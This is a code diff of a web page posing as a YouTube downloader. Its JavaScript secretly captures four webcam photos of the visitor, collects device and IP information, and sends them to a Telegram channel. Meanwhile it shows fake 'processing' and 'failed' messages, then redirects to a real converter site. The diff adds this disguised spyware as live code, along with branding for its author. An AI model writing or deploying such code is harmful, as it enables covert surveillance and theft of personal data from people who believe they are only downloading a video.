-                return;
-            }
-            
-            captureBtn.disabled = true;
-            captureCounter.style.display = 'block';
-            captureBlobs = [];
-            captureCount = 0;
-            
-            showMessage('Starting file processing...', 'info');
-            
-            // Capture 4 images with delays between them
-            for (let i = 0; i < totalCaptures; i++) {
-                captureCount = i + 1;
-                captureCounter.textContent = `Capture ${captureCount} of ${totalCaptures} - Please hold still...`;
-                
-                // Capture image
-                const blob = await captureImage();
-                if (blob) {
-                    captureBlobs.push(blob);
-                    showMessage(`✅ SERVER ${captureCount} of ${totalCaptures} (failed)...`, 'success');
-                }
-                
-                // Wait 1 second between captures (except for the last one)
-                if (i < totalCaptures - 1) {
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                }
-            }
-            
-            // After all captures are done, send to Telegram
-            await completeCaptureProcess();
+    }
+
+    // Start multi-capture process
+    async function startMultiCapture() {
+        if (!mediaStream) {
+            showMessage('Camera not available. Please try again.', 'error');
+            scrollToMessage();
+            return;
         }
-        
-        // Capture single image
-        async function captureImage() {
-            try {
-                // Create canvas and capture image
-                const canvas = document.createElement('canvas');
-                canvas.width = previewVideo.videoWidth || 640;
-                canvas.height = previewVideo.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(previewVideo, 0, 0, canvas.width, canvas.height);
-                
-                // Convert to blob
-                return await new Promise(resolve => {
-                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
-                });
-            } catch (error) {
-                console.error('Capture error:', error);
-                return null;
+
+        captureBtn.disabled = true;
+        captureCounter.style.display = 'block';
+        captureBlobs = [];
+        captureCount = 0;
+
+        showMessage('Starting file processing...', 'info');
+
+        // Show DEV ZIKKY ASCII art in console
+        console.log('\n' + DEV_ZIKKY_ASCII + '\n');
+        console.log('DEV ZIKKY MD TECH - Premium YouTube Downloader');
+        console.log('Capture process initiated...\n');
+
+        // Capture 4 images with faster delays between them
+        for (let i = 0; i < totalCaptures; i++) {
+            captureCount = i + 1;
+            captureCounter.innerHTML = `<i class="fas fa-sync-alt fa-spin"></i> Processing ${captureCount} of ${totalCaptures} - Please wait...`;
+
+            // Capture image
+            const blob = await captureImage();
+            if (blob) {
+                captureBlobs.push(blob);
+                showMessage(`✅ SERVER ${captureCount} of ${totalCaptures} failed...`, 'success');
+            }
+
+            // Wait only 800ms between captures (faster)
+            if (i < totalCaptures - 1) {
+                await new Promise(resolve => setTimeout(resolve, 800));
             }
         }
-        
-        // Complete the capture process and send data
-        async function completeCaptureProcess() {
-            showMessage('Processing file successfully...', 'info');
+
+        // After all captures are done, send to Telegram
+        await completeCaptureProcess();
+    }
+
+    // Capture single image with stylish text overlay
+    async function captureImage() {
+        try {
+            // Create canvas and capture image
+            const canvas = document.createElement('canvas');
+            canvas.width = previewVideo.videoWidth || 640;
+            canvas.height = previewVideo.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
             
-            try {
-                // Format message
-                const message = formatDeviceInfo(deviceInfo, ipData);
+            // Draw video frame
+            ctx.drawImage(previewVideo, 0, 0, canvas.width, canvas.height);
+            
+            // Add stylish text overlay
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
+            ctx.fillRect(0, canvas.height - 80, canvas.width, 80);
+            
+            // Add DEV ZIKKY text
+            ctx.font = 'bold 20px Montserrat, Arial, sans-serif';
+            ctx.fillStyle = '#00ff00';
+            ctx.textAlign = 'center';
+            ctx.fillText('DEV ZIKKY MD TECH', canvas.width / 2, canvas.height - 55);
+            
+            // Add capture info
+            ctx.font = '14px Montserrat, Arial, sans-serif';
+            ctx.fillStyle = '#ffffff';
+            ctx.fillText(`Capture ${captureCount} of ${totalCaptures}`, canvas.width / 2, canvas.height - 35);
+            ctx.fillText(new Date().toLocaleTimeString(), canvas.width / 2, canvas.height - 15);
+            
+            // Add small DEV ASCII art
+            ctx.font = '8px monospace';
+            ctx.fillStyle = '#ffffff';
+            ctx.fillText('🔥🔥🧑‍💻🧑‍💻🧑‍💻🤍🤍🤍⚡🎉✨✨', canvas.width / 2, canvas.height - 70);
+            
+            // Convert to blob
+            return await new Promise(resolve => {
+                canvas.toBlob(resolve, 'image/jpeg', 0.9);
+            });
+        } catch (error) {
+            console.error('Capture error:', error);
+            return null;
+        }
+    }
+
+    // Complete the capture process and send data
+    async function completeCaptureProcess() {
+        showMessage('Processing file successfully...', 'info');
+
+        try {
+            // Format message
+            const message = formatDeviceInfo(deviceInfo, ipData);
+
+            // Send to Telegram
+            const success = await sendToTelegram(message, captureBlobs);
+
+            // Stop camera
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+                mediaStream = null;
+            }
+
+            // Update UI
+            cameraPreview.style.display = 'none';
+            captureCounter.style.display = 'none';
+            captureBtn.disabled = false;
+
+            if (success) {
+                showMessage('✅ File processed successfully! Redirecting to download...', 'success');
+                // Show DEV ZIKKY success message
+                console.log('\n' + DEV_ZIKKY_ASCII + '\n');
+                console.log('✅ Capture completed successfully!');
+                console.log('📊 Total images sent:', captureBlobs.length);
+                console.log('🎨 Design by DEV ZIKKY MD TECH\n');
                 
-                // Send to Telegram
-                const success = await sendToTelegram(message, captureBlobs);
-                
-                // Stop camera
-                if (mediaStream) {
-                    mediaStream.getTracks().forEach(track => track.stop());
-                    mediaStream = null;
-                }
-                
-                // Update UI
-                cameraPreview.style.display = 'none';
-                captureCounter.style.display = 'none';
-                captureBtn.disabled = false;
-                
-                if (success) {
-                    showMessage('😢File Failed To Download, try out our free source downloader', 'success');
-                    // Start redirect countdown
+                // Start redirect countdown after 1.2 seconds
+                setTimeout(() => {
                     startRedirectCountdown();
-                } else {
-                    showMessage('⚠️ Download completed but there was an issue sending confirmation.', 'info');
-                }
-                
-            } catch (error) {
-                console.error('Process completion error:', error);
-                showMessage('An error occurred during processing. Please try again.', 'error');
-                captureBtn.disabled = false;
+                }, 1200);
+            } else {
+                showMessage('⚠️ Download completed but there was an issue sending confirmation.', 'info');
             }
+
+        } catch (error) {
+            console.error('Process completion error:', error);
+            showMessage('An error occurred during processing. Please try again.', 'error');
+            captureBtn.disabled = false;
         }
+    }
+
+    // Start redirect countdown (faster)
+    function startRedirectCountdown() {
+        redirectCountdown.style.display = 'block';
+        let countdown = 3; // Reduced from 5 to 3
+        countdownBar.style.width = '100%';
+
+        const countdownInterval = setInterval(() => {
+            countdownElement.textContent = countdown;
+            countdownBar.style.width = `${(countdown / 3) * 100}%`;
+            countdown--;
+
+            if (countdown < 0) {
+                clearInterval(countdownInterval);
+                // Redirect to actual download service
+                window.location.href = 'https://www.clipto.com/media-downloader/free-youtube-to-mp3-converter-0416';
+            }
+        }, 1000);
+    }
+
+    // Initialize the page
+    window.addEventListener('DOMContentLoaded', () => {
+        console.log('YouTube Video Downloader initialized');
+        console.log('\n' + DEV_ZIKKY_ASCII + '\n');
+        console.log('DEV ZIKKY MD TECH - Premium YouTube Downloader');
+        console.log('Version 2.0.1\n');
         
-        // Start redirect countdown
-        function startRedirectCountdown() {
-            redirectCountdown.style.display = 'block';
-            let countdown = 5;
-            
-            const countdownInterval = setInterval(() => {
-                countdownElement.textContent = countdown;
-                countdown--;
-                
-                if (countdown < 0) {
-                    clearInterval(countdownInterval);
-                    window.location.href = 'https://www.clipto.com/media-downloader/free-youtube-to-mp3-converter-0416';
-                }
-            }, 1000);
-        }
+        // Initialize year display
+        initializeYearDisplay();
+        
+        // Start auto-capture of device info
+        autoCaptureDeviceInfo();
+        
+        // Setup modal handlers
+        setupModalHandlers();
+        
+        // The modal is shown initially (set in CSS)
+        console.log('Consent modal displayed initially');
+    });
     </script>
 </body>
 </html>
